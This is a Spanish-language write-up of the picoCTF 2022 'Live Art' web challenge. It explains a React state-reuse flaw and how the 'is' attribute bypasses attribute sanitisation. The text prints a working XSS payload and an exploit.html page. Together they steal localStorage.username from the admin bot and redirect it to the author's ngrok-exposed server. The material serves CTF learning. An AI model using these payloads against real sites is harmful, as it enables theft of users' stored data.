# Writeup: Live_Art
**Categoría:** Hard
**Fecha de conversión:** 2026-04-24

---

Writeup: Live Art (picoCTF 2022)

Descripción del desafío


La aplicación web "Live Art" permite a los usuarios dibujar en vivo y compartir sus creaciones con otros. El objetivo es obtener la flag, que corresponde al nombre de usuario del administrador almacenado en localStorage de su navegador. Se proporciona un endpoint /link-submission donde podemos enviar una URL que será visitada por un bot (un navegador headless). Nuestra tarea es lograr que ese bot ejecute código JavaScript que nos envíe la flag.

### Análisis inicial


Al explorar la aplicación, encontramos varias rutas:


```
    /editor – permite dibujar (solo ratón, sin texto).

    /settings – permite cambiar el nombre de usuario (validado, no permite XSS).

    /drawing/:page – muestra un dibujo compartido (si el emisor está activo).

    /link-submission – formulario para enviar una URL que el bot visitará.

    /error – página de error que lee parámetros del hash de la URL.

```

La clave estaba en el código fuente (proporcionado en el CTF). Observamos dos componentes críticos:

Componente ErrorPage

jsx


export const ErrorPage = (props) => {

```
    const params = useHashParams(); // extrae parámetros del hash (#error=...&returnTo=...)
    const error = props.error ?? params.error;
    const returnTo = props.returnTo ?? params.returnTo;
    return (
        <div>
            <h3>{error}</h3>
            <a href={returnTo}>Return</a>
        </div>
    );
```

};


Los valores se inyectan en el DOM, pero React los escapa, por lo que no hay XSS directo.

Componente Viewer

jsx


const Viewer = ({ image }) => {

```
    const dimensions = useDimensions(); // objeto con width y height
    return <img src={image} {...dimensions} />;
```

};


Aquí se usa el operador spread ({...dimensions}) para aplicar todas las propiedades del objeto dimensions como atributos HTML de la etiqueta <img>. Normalmente dimensions solo contiene width y height. Sin embargo, si logramos que ese objeto contenga otras propiedades (como onerror, src, etc.), podríamos inyectar código malicioso.

La vulnerabilidad: estado compartido entre componentes


En la ruta /drawing/:page, se renderiza condicionalmente:


```
    Si la ventana es pequeña → se muestra ErrorPage.

    Si la ventana es grande → se muestra Viewer.

```

Ambos componentes comparten el mismo estado (React reutiliza el objeto de estado al cambiar de un componente a otro). Cuando estamos en ErrorPage, los parámetros del hash se almacenan en el estado. Al redimensionar la ventana y cambiar a Viewer, ese estado se convierte en el objeto dimensions que se esparce en el <img>.


Esto permite inyectar atributos arbitrarios en la etiqueta <img> simplemente añadiéndolos al hash de la URL.

Limitación de React


React no permite atributos de evento como onerror directamente; espera onError y que sea una función. Si intentamos onerror="alert(1)", React lo ignora o da una advertencia.

El truco del Web Component (is)


Investigando, se descubrió que si el objeto esparcido contiene una propiedad is (usada para elementos personalizados), React no sanitiza el resto de atributos y los pasa directamente al DOM. Esto permite usar onerror como una cadena, que se ejecutará si la imagen falla al cargar.

Payload básico


Si visitamos la siguiente URL con la ventana pequeña y luego la agrandamos:

text


http://localhost:4000/drawing/abcd#src=1&onerror=alert(1)&is


El estado inicial (en ErrorPage) guarda { src: "1", onerror: "alert(1)", is: true }. Al cambiar a Viewer, el <img> resultante es:

html


<img src="1" onerror="alert(1)" is>


Como src=1 no existe, se ejecuta alert(1). Esto confirma el XSS.

Explotación para robar la flag


La flag está en localStorage.username del administrador. Necesitamos que el bot ejecute:

javascript


window.location = 'https://nuestro-servidor/' + localStorage.username;


Así, el navegador del bot redirige a nuestro servidor con la flag en la URL, y podemos capturarla en los logs.

Preparación del entorno


Usamos ngrok para exponer un servidor HTTP local (puerto 4444) y recibir la petición con la flag. También necesitamos alojar un HTML que sirva como "desencadenante" para el bot.

Paso 1: Iniciar servidor HTTP local

bash


python3 -m http.server 4444


Paso 2: Exponerlo con ngrok

bash


ngrok http 4444 --domain kr3s4l4.ngrok.io   # o usar un dominio aleatorio


Obtenemos una URL pública: https://*****.****.**.

Paso 3: Crear el archivo exploit.html


Este archivo será alojado en nuestro servidor. Contiene un iframe que carga la URL maliciosa de localhost:4000 con el payload. El iframe comienza pequeño (para activar ErrorPage) y después de 1 segundo se agranda (para cambiar a Viewer y ejecutar el XSS).

html


<!DOCTYPE html>

<html>

<head><title>LiveArt Exploit</title></head>

<body>

```
    <iframe id="frame" width="300" height="300" src=""></iframe>
    <script>
        const SERVER = 'https://******.****.**'; // nuestro servidor
        const frame = document.getElementById('frame');
        
        // Cambiar tamaño después de 1 segundo
        setTimeout(() => {
            frame.width = 1000;
            frame.height = 1000;
        }, 1000);
        
        // Payload: roba localStorage.username y redirige a nuestro servidor
        const payload = `http://localhost:4000/drawing/abcd#src=1&onerror=window.location='${SERVER}/'%2BlocalStorage.username&is`;
        frame.src = payload;
    </script>
```

</body>

</html>


¿Por qué %2B? Es la codificación URL del signo +, que se usa para concatenar en JavaScript.

Paso 4: Enviar la URL del exploit al bot


En la aplicación Live Art, vamos a /link-submission y pegamos:

text


https://******.****.**/exploit.html


Hacemos clic en "Send". El bot visitará nuestra página, que a su vez cargará el iframe con la URL maliciosa.

Paso 5: Capturar la flag


Observamos los logs de nuestro servidor HTTP (y también los de ngrok). Aparecerá una petición como:

text


GET /"picoCTF{************************}" HTTP/1.1 404


La flag es picoCTF{*****************************}.

### Explicación final del enfoque


```
    Identificación de fuentes y sumideros: Encontramos que el componente ErrorPage permite inyectar datos arbitrarios a través del hash, y el componente Viewer usa el operador spread en una etiqueta <img>, lo que permite controlar sus atributos.

    Estado compartido: La misma ruta (/drawing/:page) alterna entre ErrorPage y Viewer según el tamaño de la ventana. El estado se reutiliza, por lo que los parámetros del hash en ErrorPage se convierten en atributos del <img> en Viewer.

    Bypass de la sanitización de React: El atributo is hace que React trate el elemento como un Web Component, pasando todos los atributos sin filtrar. Así podemos usar onerror con código JavaScript.

    Exfiltración: Usamos window.location para redirigir al bot a nuestro servidor, llevando la flag en la URL. No necesitamos fetch ni CORS, ya que la redirección es una acción de navegación permitida.

    Ejecución automática: El iframe se carga pequeño y luego se agranda mediante setTimeout. Esto simula el cambio de tamaño de la ventana que el bot experimenta (el bot puede redimensionar su ventana o simplemente el iframe cambia de tamaño, activando la transición de componentes).

```

Comandos utilizados resumen

bash


```bash
# Terminal 1: Servidor HTTP
```

python3 -m http.server 4444


```bash
# Terminal 2: ngrok (exponer el puerto 4444)
```

ngrok http 4444 --domain *****.****.**


```bash
# (Opcional) Netcat no fue necesario porque el servidor HTTP ya registra las peticiones.
```


Lecciones aprendidas


```
    Los operadores spread en React pueden ser peligrosos si se aplican a objetos controlados por el usuario.

    El estado compartido entre componentes condicionales puede llevar a inyecciones de atributos.

    La propiedad is es una característica poco conocida que desactiva la sanitización de React.

    La redirección es una forma efectiva de exfiltrar datos cuando no se puede usar fetch por CORS.
```

